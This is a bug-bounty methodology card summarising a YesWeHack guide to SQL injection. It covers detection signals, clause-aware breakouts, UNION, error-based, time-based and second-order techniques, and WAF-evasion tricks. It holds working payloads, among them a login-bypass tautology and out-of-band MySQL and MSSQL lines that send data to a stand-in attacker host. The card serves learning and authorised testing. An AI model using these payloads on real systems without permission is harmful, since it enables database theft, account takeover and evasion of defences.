# YesWeHack bug-bounty SQLi workflow: know the clause, pick the channel, breakout-context payloads, WAF obfuscation

- **Vuln type / sub-variant:** bug-bounty-oriented methodology across all SQLi channels, with emphasis on injection context and WAF evasion
- **Target type:** web endpoints whose user params map to backend queries (search, product id, login, JSON APIs)
- **Recon signal:** errors, strange behaviour, or inconsistent response times after unexpected characters or timing payloads; `'` -> error/500; `OR true-- -` -> extra results
- **Root cause:** input concatenated into SQL; persists even with ORMs if sanitization is skipped (cites WordPress WP_Query CVE-2022-21661)
- **Exploitation steps:**
  1. Identify the clause/context first (SELECT/UPDATE/DELETE/INSERT), because the breakout differs.
  2. Boolean login bypass: `username=noexist' OR 1=1 -- -` logs in as the first user (usually admin).
  3. UNION when output reflects; error-based via `CAST` (`1=CAST((SELECT password FROM users) AS int)`).
  4. Time-based for JSON APIs with uniform responses: MySQL `x'XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR'` or `BENCHMARK(...)`; MSSQL `WAITFOR DELAY`.
  5. OOB for async-stored input (cookies, Referer logged later): MySQL `INTO OUTFILE '\\\\attacker\x'`, MSSQL `xp_dirtree '//attacker/x'`; unique subdomain per payload.
  6. Second-order: inject a stored field (username/preference), then find the endpoint that reuses it unsafely.
  7. Context-aware breakout: a classic `x' OR 1=1 -- -` fails in an INSERT tuple; use `x'||'y` or close the tuple `x', (SELECT ...), 'y')-- -`.
- **Bypasses used (WAF obfuscation):** comments for spaces `'/**/OR/**/1=1-- -`; newline `'OR%0A1=1-- -`; parentheses `'OR(1=1)-- -`; mixed case `'oR 1=1-- -`
- **Impact:** data exfiltration, modify/delete, privesc, RCE via file-write/upload
- **Bounty:** reference (bug-bounty guide)
- **Lesson / pattern:** manually map the injection context before firing sqlmap; choose the channel by what the app reveals; breakout payloads must match the clause; when a WAF blocks, obfuscate (comments/newlines/parentheses/case) or use tamper scripts.
- **Source:**
  - Title: SQLi: The ultimate Bug Bounty guide to exploiting SQL injection vulnerabilities
  - Author: Alex Brumen (YesWeHack)
  - URL: https://www.yeswehack.com/learn-bug-bounty/vulnerability-vectors-sql-injection
  - Date: 2025-08-12 (scraped 2026-11-19)
  - Raw file: `sources/sqli/06-yeswehack-sqli-bug-bounty-guide.md`

Tags: methodology, reference, breakout-context, insert, auth-bypass-tautology, boolean-blind, time-based, oob-oast, second-order, into-outfile, xp-dirtree, waf-bypass, comment-whitespace, newline, parentheses, case-variation, sqlmap
